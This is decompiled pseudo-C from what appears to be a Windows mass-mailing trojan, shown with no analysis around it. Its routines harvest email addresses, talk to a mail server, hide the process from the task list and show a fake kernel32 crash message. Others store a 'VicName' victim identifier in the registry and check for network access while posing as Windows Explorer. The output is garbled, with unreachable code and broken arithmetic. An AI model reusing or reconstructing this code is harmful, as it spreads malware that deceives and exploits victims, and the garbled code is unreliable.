stack space not deallocated on return
/*	Procedure: 0x00406212 - 0x004063EF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406212()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252784;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 24;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 4) = 0;
    if(*(ebp + 12) == 0) {
        *L0041A6E4 = 0;
        *L0041A6E0 = 0;
    } else {
        edi = *(ebp + 8);
        if(edi != esi) {
            goto L0040625e;
        }
    }
L00406257:
    eax = 0;
    goto L004063c3;
L0040625e:
    (save)edi;
    *__imp__CharLowerA();
    *(ebp - 36) = esi;
    ebx = "\r\n";
L0040626d:
    while(*(ebp - 36) < 2) {
        for(*(ebp - 28) = edi; 1; L00407CBA(esi, eax + 1)) {
            if(*(ebp - 28) == 0) {
                goto L0040626d;
            }
            eax = "\r\nfrom:";
            if(*(ebp - 36) != 0) {
                eax = "\r\nreply-to:";
            }
            esi = L0040A070( *(ebp - 28), eax);
            *(ebp - 32) = esi;
            if(esi == 0) {
                goto L0040626d;
            }
            eax = L0040A070(esi + 2, ebx);
            *(ebp - 28) = eax;
            if(eax == 0) {
                continue;
            }
            eax = eax - esi;
            *(ebp - 40) = eax;
            if(eax <= 12 || eax >= 200) {
                continue;
            }
        }
    }
    *(ebp - 32) = edi;
    esi = "221";
    do {
        edi = 0;
        eax = *L0041A6E0;
        if(*(ebp - 36) = *(ebp - 36) + 1) {
            eax = L0040A5F0( *(ebp - 32), esi, 3);
            *L0041A6E0 = 1;
        } else {
            if(!(eax = eax - 1)) {
                goto L004062ef;
            }
            eax = L0040A070( *(ebp - 32), "\r\n.\r\n");
            *(ebp - 28) = eax;
            if(eax == edi) {
                goto L00406257;
            }
            *L0041A6E4 = *L0041A6E4 + 1;
            eax = eax + 5;
            *(ebp - 28) = eax;
            *(ebp - 32) = eax;
            if(*eax == 0) {
                goto L0040636d;
            }
            if(L0040A5F0(eax, esi, 3) != 0) {
                *L0041A6E0 = 2;
                goto L004063b5;
L004062ef:
                if(!(eax = eax - 1)) {
                    eax = L0040A070( *(ebp - 32), ebx);
                    *(ebp - 28) = eax;
                    if(*(ebp - 28) == edi) {
                        goto L00406257;
                    }
                    *L0041A6E4 = *L0041A6E4 + 1;
                    *(ebp - 28) = *(ebp - 28) + 2;
                    if(L0040A5F0( *(ebp - 28), esi, 3) == 0) {
                        *L0041A6E0 = 1;
                    }
                    *(ebp - 32) = *(ebp - 28);
                }
            }
        }
L004063b5:
        if(*L0041A6E4 >= *(ebp + 12)) {
            goto L004063c0;
        }
    } while(*(ebp - 32) != edi);
    goto L004063db;
L0040636d:
    if(*L0041A6E4 < *(ebp + 12)) {
        *L0041A6E0 = edi;
        goto L00406257;
    }
L004063c0:
    eax = 1;
L004063c3:
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004063e1;
    return(1);
    esp = *(ebp - 24);
L004063db:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L004063e1:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/* DEST BLOCK NOT FOUND: 004066be -> 004066d5 */
stack space not deallocated on return
/*	Procedure: 0x004063F0 - 0x004066C2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004063F0()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252800;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 700;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp + -696) = 0;
    ecx = 87;
    eax = 0;
    edi = ebp + -695;
    asm("rep stosd");
    *edi = al;
    edi = edi + 1;
    *(ebp + -340) = 1;
    ebx = 0;
    *(ebp - 4) = 0;
    (save)0;
    (save) *(ebp + 12);
    eax = *__imp__GetFileSize();
    *(ebp + -704) = eax;
    *(ebp - 28) = eax <= 300 ? ebx : L00406850(eax + -150);
    (save)ebx;
    (save)ebx;
    (save) *(ebp - 28);
    (save) *(ebp + 12);
    *__imp__SetFilePointer();
    (save)ebx;
    (save)ebp - 32;
    (save)299;
    (save)ebp + -336;
    (save) *(ebp + 12);
    *__imp__ReadFile();
    *(ebp + *(ebp - 32) + -336) = 0;
    esi = "\r\n";
    eax = L0040A070(ebp + -336, esi);
L004064af:
    *(ebp + -344) = eax;
    if(eax != ebx) {
        eax = eax + 2;
        if(*eax == 0) {
            goto L00406517;
        }
        *(ebp + -344) = eax;
        eax = L0040A070(eax, esi);
        edi = eax;
        *(ebp - 36) = edi;
        if(edi == ebx) {
            goto L00406517;
        }
        *edi = 0;
        if(*(ebp + -340) == ebx) {
            L0040A100(ebp + -696, ",");
        } else {
            *(ebp + -340) = ebx;
        }
        L0040A100(ebp + -696, *(ebp + -344));
        eax = edi;
        goto L004064af;
    }
L00406517:
    if(*(ebp + -696) != 0) {
        esi = 0x412f48;
        ecx = 0x412f48;
        L00401830(ebp + -336, 4);
        ecx = 0x412f48;
        L00401B15(1);
        ecx = 0x412f48;
        eax = L00401946( *(ebp + 8), 119, *L0041A6DC);
        *(ebp + -700) = eax;
        if(eax != 1) {
            goto L004065a6;
        }
        (save)12000;
        (save) *L00412DD4;
        eax = *__imp__WaitForSingleObject();
        ebx = 258;
        if(eax != 258) {
            ecx = esi;
            eax = L0040A5F0(L00401830(ebp + -336, 4), "20", 2);
            if(eax == 0) {
                goto L004065b3;
            }
            goto L004066a6;
L004065a6:
            if(eax != ebx) {
                ebx = 258;
L004065b3:
                ecx = esi;
                L00401A9E("POST\r\n");
                (save)7000;
                (save) *L00412DD4;
                eax = *__imp__WaitForSingleObject();
                if(eax != ebx) {
                    ecx = esi;
                    eax = L0040AAB0(L00401830(ebp + -336, 3), "340");
                    if(eax == 0) {
                        eax = L0040AA95(180000);
                        edi = eax;
                        *(ebp + -712) = edi;
                        *(ebp + -708) = edi;
                        if(edi != 0) {
                            L00402478(edi, 0, ebp + -696);
                            ecx = esi;
                            L00401A9E(edi);
                            (save)200000;
                            (save) *L00412DD4;
                            *(ebp - 32) = *__imp__WaitForSingleObject();
                            *(ebp + -716) = edi;
                            L0040AB34(edi);
                            if(*(ebp - 32) == ebx) {
                                goto L00406696;
                            }
                            ecx = esi;
                            eax = L0040AAB0(L00401830(ebp + -336, 3), "240");
                            if(eax == 0) {
                                ecx = esi;
                                L00401A9E("QUIT\r\n");
                                (save)700;
                                *__imp__Sleep();
L00406696:
                                ecx = esi;
                                eax = L004018D3();
                                goto L004066a6;
                                return(1);
                                esp = *(ebp - 24);
                            }
                        }
                    }
                }
            }
        }
    }
L004066a6:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    L004066C3();
    goto L004066d5;
}

/* DEST BLOCK NOT FOUND: 004066e6 -> 00401be7 */
/*	Procedure: 0x004066C3 - 0x004066EA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004066C3()
{



    *L0041A820 = 0;
    *L0041A818 = 0;
    *L0041A81C = 0;
    return(0);
    return(L0040AC53(0x4066e1));
    ecx = 4302872;
    goto L00401BE7;
}

stack space not deallocated on return
/*	Procedure: 0x004066EB - 0x0040679D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004066EB()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252816;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 20;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 32) = 0;
    *(ebp - 4) = 0;
    (save)ebp - 36;
    (save)ebp - 32;
    (save)0;
    (save)2;
    (save)0;
    (save)0;
    (save)0;
    (save) *(ebp + 12);
    (save) *(ebp + 8);
    *__imp__RegCreateKeyExA();
    if(*(ebp - 32) == esi) {
L00406738:
        eax = 0;
L0040673a:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        if(*(ebp + 20) == 4) {
            (save)4;
            (save) *(ebp + 24);
            (save)4;
        } else {
            (save) *(ebp + 24);
            (save) *__imp__lstrlenA();
            (save) *(ebp + 24);
            (save) *(ebp + 20);
        }
        (save)esi;
        (save) *(ebp + 16);
        (save) *(ebp - 32);
        *(ebp - 28) = *__imp__RegSetValueExA();
        *__imp__RegCloseKey( *(ebp - 32));
        if(*(ebp - 28) != esi) {
            goto L00406738;
        }
        eax = 1;
        goto L0040673a;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040679E - 0x0040683F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040679E()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252832;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 24;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 40) = 0;
    *(ebp - 36) = 100;
    *(ebp - 4) = 0;
    esi = *(ebp + 20);
    *esi = 0;
    (save)ebp - 40;
    (save)1;
    (save)0;
    (save) *(ebp + 12);
    (save) *(ebp + 8);
    *__imp__RegOpenKeyExA();
    if(*(ebp - 40) == ebx) {
L004067f0:
        eax = 0;
L004067f2:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        (save)ebp - 36;
        (save)esi;
        (save)ebp - 28;
        (save)ebx;
        (save) *(ebp + 16);
        (save) *(ebp - 40);
        *(ebp - 32) = *__imp__RegQueryValueExA();
        *__imp__RegCloseKey( *(ebp - 40));
        if(*(ebp - 32) != ebx) {
            goto L004067f0;
        }
        eax = 1;
        goto L004067f2;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 0;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x00406840 - 0x0040684F
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00406840(A4)
/* unknown */ void  A4;
{



    eax = L00406850(100);
    A4 :: eax;
    asm("sbb eax,eax");
    return(eax + 1);
}

stack space not deallocated on return
/*	Procedure: 0x00406850 - 0x004068F3
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406850()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252848;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 12;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ecx = 0;
    *(ebp - 4) = 0;
    edi = *(ebp + 8);
    if(edi <= 0) {
L00406882:
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = ecx;
    } else {
        esi = *__imp__GetTickCount();
        *(ebp - 28) = esi;
        if(esi != *L0041A824) {
            L0040AD6C(esi);
            *L0041A824 = esi;
        }
        if(edi < 32768) {
            L0040AD79();
            edx = 0;
            ecx = edi / edi % edi / edi + 1;
            goto L00406882;
        }
        ecx = L0040AD79();
        eax = edi;
        edx = 0;
        edx = 32767 / 32767 % 32767 / 32767;
        eax = eax * ecx;
        goto L00406882;
        return(1);
        esp = *(ebp - 24);
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 1;
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x004068F4 - 0x0040696A
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004068F4()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252864;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 12;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    *(ebp - 28) = 0;
    edi = *(ebp + 12);
    for(esi = *(ebp + 8); *(ebp - 28) < edi; *(ebp - 28) = *(ebp - 28) + 1) {
        *( *(ebp - 28) + esi) = L00406850(26) + 96;
    }
    *(esi + edi) = bl;
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L0040695a;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    esi = *(ebp + 8);
L0040695a:
    eax = esi;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x0040696B - 0x004069E1
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040696B()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252880;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 12;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    *(ebp - 28) = 0;
    edi = *(ebp + 12);
    for(esi = *(ebp + 8); *(ebp - 28) < edi; *(ebp - 28) = *(ebp - 28) + 1) {
        *( *(ebp - 28) + esi) = L00406850(9) + 48;
    }
    *(esi + edi) = bl;
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L004069d1;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    esi = *(ebp + 8);
L004069d1:
    eax = esi;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x004069E2 - 0x00406A50
 *	Argument size: -112
 *	Local size: 112
 *	Save regs size: 0
 */

L004069E2()
{
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vfffffff4;



    (save)"Memory access violation in module kernel32 at ";
    (save) & Vffffff90;
    L0040A0F0();
    (save)4;
    (save) & Vfffffff4;
    (save)L0040696B();
    (save) & Vffffff90;
    L0040A100();
    (save)":";
    (save) & Vffffff90;
    L0040A100();
    (save)8;
    (save) & Vfffffff4;
    (save)L0040696B();
    (save) & Vffffff90;
    L0040A100();
    esp = esp + 48;
    *__imp__MessageBoxA();
    return(*__imp__Sleep(1200, 0, & Vffffff90, "Error occurred", 16));
}

stack space not deallocated on return
/*	Procedure: 0x00406A51 - 0x00406AC9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406A51()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252896;
    (save)0x40a384;
    eax = *%fs:0x0];
    (save)eax;
    *%fs:0x0] = esp;
    esp = esp - 16;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 4) = 0;
    if(*L0041A66C != 0) {
        (save)"kernel32.dll";
        eax = *__imp__GetModuleHandleA();
        *(ebp - 28) = eax;
        if(eax != esi) {
            (save)"RegisterServiceProcess";
            (save)eax;
            eax = *__imp__GetProcAddress();
            *(ebp - 32) = eax;
            if(eax != esi) {
                eax = *eax(esi, 1);
                goto L00406ab7;
                return(1);
                esp = *(ebp - 24);
            }
        }
    }
L00406ab7:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00406ACA - 0x00406ADA
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406ACA()
{



    (save)ebp;
    ebp = esp;
    (save)ebx;
    (save)esi;
    (save)edi;
    (save)0x406add;
    (save)0x406ae1;
}

/*	Procedure: 0x00406ADB - 0x00406AEC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406ADB()
{



    *ebx();
    goto L00406ae5;
    ecx = 0;
    (restore)eax;
    goto ( *eax);
    asm("sahf");
L00406ae5:
    ebx = bl >> cl | *(L00406AED() - 21);
}

stack space not deallocated on return
/*	Procedure: 0x00406AED - 0x00406AFC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406AED()
{



    (restore)eax;
    goto L00406af1;
    goto (eax - 1 + 1);
    *ebx();
    eax = *ecx();
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00406AFD - 0x00406BE2
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406AFD()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252912;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 16;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    edi = __imp__GetTickCount;
    *(ebp - 28) = *__imp__GetTickCount();
    esi = *(ebp + 8);
    eax = *esi;
    if((eax + eax * 2 + 30 == 327 || eax + eax - 4 == 130) && L0040A210(esi) == 4) {
        eax = *(esi + 2);
        if(eax - 33 == 81) {
            goto L00406b6f;
        }
        if(eax + 10 == 92) {
L00406b6f:
            L00406ACA();
            eax = *(esi + 1);
            if(eax - 12 == 105) {
                goto L00406b88;
            }
            if(eax + -40 == 45) {
L00406b88:
                if(*edi() - *(ebp - 28) < 20) {
                    eax = *(esi + 3);
                    if(eax + 20 == 121) {
                        goto L00406ba7;
                    }
                    if(eax + eax - 25 == 113) {
L00406ba7:
                        for(*(ebp - 32) = 0; *(ebp - 32) < 100; *(ebp - 32) = *(ebp - 32) + 1) {
                            *__imp__Sleep(5);
                        }
                        *(ebp - 4) = *(ebp - 4) | -1;
                        eax = 1;
                        goto L00406bd4;
                        return(1);
                        esp = *(ebp - 24);
                    }
                }
            }
        }
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00406bd4:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00406BE3 - 0x00406DCC
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406BE3()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252928;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 908;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    if(L0040A210( *(ebp + 8)) < 4) {
L00406c1e:
        (save)1200;
        eax = *__imp__Sleep();
    } else {
        eax = L0040ACB0( *(ebp + 8), 34);
        esi = eax;
        *(ebp + -840) = esi;
        if(esi != 0) {
            esi = esi + 1;
            *(ebp + -840) = esi;
            eax = L0040ACB0(esi, 34);
            edi = eax;
            *(ebp + -284) = edi;
            if(edi != 0 && edi != esi) {
                ebx = edi - esi;
                (save)ebx;
                (save)esi;
                (save)ebp + -280;
                L0040A460();
                *(ebp + ebx + -280) = 0;
                (save)1;
                (save)ebp + -280;
                esp = esp + 20;
                if(L00401000() != 0) {
L00406ca2:
                    eax = L004069E2();
                } else {
                    L004010E3(ebp + -280, ebp + -836);
                    if(*(ebp + -836) != 0) {
                        esi = 0;
                        if(L00401000(ebp + -836, 0) == 0) {
                            goto L00406ce3;
                        }
                        goto L00406ca2;
                    }
                    esi = 0;
L00406ce3:
                    *(ebp + -840) = edi;
                    if(L0040A210(edi) <= 2) {
                        goto L00406d5a;
                    }
                    edi = edi + 2;
                    *(ebp + -840) = edi;
                    if(L00401000(edi, esi) != 0) {
                        goto L00406ca2;
                    }
                    (save)550;
                    (save)ebp + -836;
                    (save)esi;
                    *__imp__GetModuleFileNameA();
                    if(L0040D680(ebp + -280, ebp + -836) != 0) {
                        goto L00406d60;
                    }
                    eax = L0040D680(edi, "autorun");
                    if(eax != 0) {
                        if(L00406AFD(edi) != 0) {
                            eax = L00409A73();
                            goto L00406dba;
L00406d5a:
                            *(ebp + -840) = esi;
                        }
L00406d60:
                        *(ebp + -924) = esi;
                        ecx = 16;
                        eax = 0;
                        edi = ebp + -920;
                        asm("rep stosd");
                        *(ebp + -924) = 68;
                        *(ebp + -856) = esi;
                        edi = ebp + -852;
                        *edi = eax;
                        edi = edi + 4;
                        *edi = eax;
                        edi = edi + 4;
                        *edi = eax;
                        edi = edi + 4;
                        *__imp__CreateProcessA(esi, *(ebp + 8), esi, esi, esi, 67108864, esi, esi, ebp + -924, ebp + -856);
                        goto L00406c1e;
                        return(1);
                        esp = *(ebp - 24);
                    }
                }
            }
        }
    }
L00406dba:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00406DCD - 0x00406F03
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406DCD()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252944;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 136;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp + -152) = 0;
    *(ebp - 28) = 0;
    *(ebp - 48) = 100;
    *(ebp - 4) = 0;
    edi = *(ebp + 8);
    *edi = 0;
    (save)ebp + -152;
    (save)9;
    (save)0;
    esi = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";
    (save)esi;
    (save)-2147483646;
    *__imp__RegOpenKeyExA();
    if(*(ebp + -152) == ebx) {
        eax = 0;
    } else {
        while(1) {
            (save)ebp - 40;
            (save)ebx;
            (save)ebx;
            (save)ebx;
            (save)ebp - 48;
            (save)ebp + -148;
            (save) *(ebp - 28);
            (save) *(ebp + -152);
            eax = *__imp__RegEnumKeyExA();
            if(eax != 0) {
                goto L00406eda;
            }
            for(*(ebp - 32) = ebx; 1; eax = eax + 1) {
                *(ebp - 44) = eax;
                if(eax >= *(ebp - 48)) {
                    goto L00406e8e;
                }
                cl = *(ebp + eax + -148);
                if(cl < 65 || cl > 90) {
                    break;
                }
                ecx = cl;
                *(ebp - 32) = *(ebp - 32) + ecx - 64;
            }
            *(ebp - 32) = ebx;
L00406e8e:
            if(*(ebp - 32) == 80) {
                break;
            }
            *(ebp - 28) = *(ebp - 28) + 1;
            *(ebp - 48) = 100;
        }
        (save)esi;
        (save)edi;
        L0040A0F0();
        (save)"\";
        (save)edi;
        L0040A100();
        (save)ebp + -148;
        (save)edi;
        L0040A100();
        esp = esp + 24;
        (save) *(ebp + -152);
        *__imp__RegCloseKey();
        eax = 1;
    }
    *(ebp - 4) = *(ebp - 4) | -1;
    goto L00406ef5;
L00406eda:
    *__imp__RegCloseKey( *(ebp + -152));
    goto L00406eef;
    return(1);
    esp = *(ebp - 24);
L00406eef:
    *(ebp - 4) = *(ebp - 4) | -1;
    eax = 0;
L00406ef5:
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00406F04 - 0x0040703B
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00406F04()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252960;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 52;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 32) = 0;
    *(ebp - 4) = 0;
    esi = "wininet.dll";
    (save)esi;
    edi = *__imp__GetModuleHandleA();
    *(ebp - 40) = edi;
    if(edi == ebx) {
        (save)esi;
        edi = *__imp__LoadLibraryA();
        *(ebp - 40) = edi;
        if(edi == ebx) {
            goto L00406fc3;
        }
    }
    (save)"InternetOpenA";
    (save)edi;
    esi = __imp__GetProcAddress;
    *(ebp - 60) = *__imp__GetProcAddress();
    (save)"InternetGetConnectedState";
    (save)edi;
    *(ebp - 68) = *esi();
    (save)"InternetCloseHandle";
    (save)edi;
    eax = *esi();
    *(ebp - 64) = eax;
    if(*(ebp - 60) != ebx) {
        if(*(ebp - 68) == ebx || eax == ebx) {
            goto L00406fc3;
        }
        (save)536870912;
        (save)ebx;
        (save)ebx;
        (save)ebx;
        (save)"Windows Explorer";
        *(ebp - 36) = *(ebp - 60)();
        (save)ebx;
        (save)ebp - 32;
        *(ebp - 28) = *(ebp - 68)();
        if(*(ebp - 36) != ebx) {
            (save) *(ebp - 36);
            *(ebp - 64)();
        }
        if(*(ebp - 28) == ebx) {
            goto L00406fc3;
        }
        *(ebp - 4) = *(ebp - 4) | -1;
        eax = 1;
    } else {
L00406fc3:
        *(ebp - 48) = ebx;
        *(ebp - 56) = 4;
        (save)ebp - 52;
        (save)1;
        (save)ebx;
        (save)"System\CurrentControlSet\Services\RemoteAccess";
        (save)-2147483646;
        *__imp__RegOpenKeyExA();
        *__imp__RegQueryValueExA();
        *__imp__RegCloseKey( *(ebp - 52), *(ebp - 52), "Remote Connection", ebx, ebp - 44, ebp - 48, ebp - 56);
        if(*(ebp - 48) != ebx) {
            eax = 1;
L00407010:
            *(ebp - 4) = *(ebp - 4) | -1;
        } else {
            *L0041A604 = ebx;
            eax = 0;
            goto L00407010;
            return(1);
            esp = *(ebp - 24);
            *(ebp - 4) = *(ebp - 4) | -1;
            eax = 0;
        }
    }
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x0040703C - 0x004070C0
 *	Argument size: -44
 *	Local size: 52
 *	Save regs size: 0
 */

L0040703C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffcc;



    eax = A8;
    (save)esi;
    == ? L0040707f : ;
    if(!(eax = eax - 1)) {
        if(eax = eax - 1) {
            goto L00407096;
        }
        (save)"Passwords do not match";
        L0040A0F0( & Vffffffcc);
        esi = 1008;
        (restore)ecx;
    } else {
        (save)"Invalid Server Name";
        L0040A0F0( & Vffffffcc);
        esi = 1004;
        (restore)ecx;
        goto L00407099;
        (save)"Invalid Email Address";
        L0040A0F0( & Vffffffcc);
        esi = 1003;
        (restore)ecx;
        goto L00407099;
L00407096:
        esi = Ac;
    }
L00407099:
    *__imp__MessageBoxA();
    eax = *__imp__SetFocus( *__imp__GetDlgItem(), Ac, esi, Ac, & Vffffffcc, "MAPI32", 48);
    (restore)esi;
}

stack space not deallocated on return
/*	Procedure: 0x004070C1 - 0x004073F7
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004070C1()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252976;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 316;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    ebx = 0;
    *(ebp - 4) = 0;
    (save)100;
    (save)ebp + -224;
    (save)1003;
    edi = *(ebp + 8);
    (save)edi;
    esi = __imp__GetDlgItemTextA;
    *__imp__GetDlgItemTextA();
    if(L004075E3(ebp + -224, 1) == 0) {
        (save)edi;
        (save)ebx;
    } else {
        (save)100;
        (save)ebp + -324;
        (save)1004;
        (save)edi;
        *esi();
        if(L004075E3(ebp + -324, ebx) != 0) {
            goto L00407154;
        }
        (save)edi;
        (save)1;
    }
    L0040703C();
    goto L004073e3;
L00407154:
    (save)ebp + -224;
    edi = 0x412e10;
    (save)0x412e10;
    L0040A0F0();
    (save)ebp + -324;
    (save)4302452;
    L0040A0F0();
    (save)edi;
    (save)1;
    (save)"Email Address";
    ebx = 4302344;
    (save)4302344;
    edi = -2147483646;
    (save)-2147483646;
    L004066EB();
    (save)4302452;
    (save)1;
    (save)"Server";
    (save)4302344;
    (save)-2147483646;
    L004066EB();
    esp = esp + 56;
    (save)100;
    (save)ebp + -224;
    (save)1002;
    (save) *(ebp + 8);
    *esi();
    if(L0040A210(ebp + -224) <= 0) {
        *(ebp + -328) = 100;
        (save)ebp + -328;
        (save)ebp + -224;
        if(*__imp__GetComputerNameA() == 0) {
            L0040A0F0(ebp + -224, "unknown");
        }
    }
    L004066EB(edi, ebx, "VicName", 1, ebp + -224);
    (save)100;
    (save)ebp + -324;
    (save)1008;
    (save) *(ebp + 8);
    *esi();
    (save)100;
    (save)ebp - 124;
    (save)1009;
    (save) *(ebp + 8);
    *esi();
    if(L0040A210(ebp + -324) <= 0 && L0040A210(ebp - 124) <= 0) {
        goto L004073d2;
    }
    if(L0040AAB0(ebp + -324, ebp - 124) != 0) {
        (save) *(ebp + 8);
        (save)2;
        L0040703C();
        eax = 0;
L00407281:
        *(ebp - 4) = *(ebp - 4) | -1;
    } else {
        (save)100;
        (save)ebp + -224;
        (save)1007;
        (save) *(ebp + 8);
        *esi();
        (save)100;
        (save)ebp - 124;
        (save)1010;
        (save) *(ebp + 8);
        *esi();
        if(L0040A210(ebp + -224) == 0) {
            L0040A0F0();
            eax = L0040ACB0(ebp + -224, 64, ebp + -224, 0x412e10);
            *(ebp + -332) = eax;
            if(eax != 0) {
                *eax = 0;
            }
        }
        if(L0040A210(ebp - 124) == 0 || L004075E3(ebp - 124, 0) == 0) {
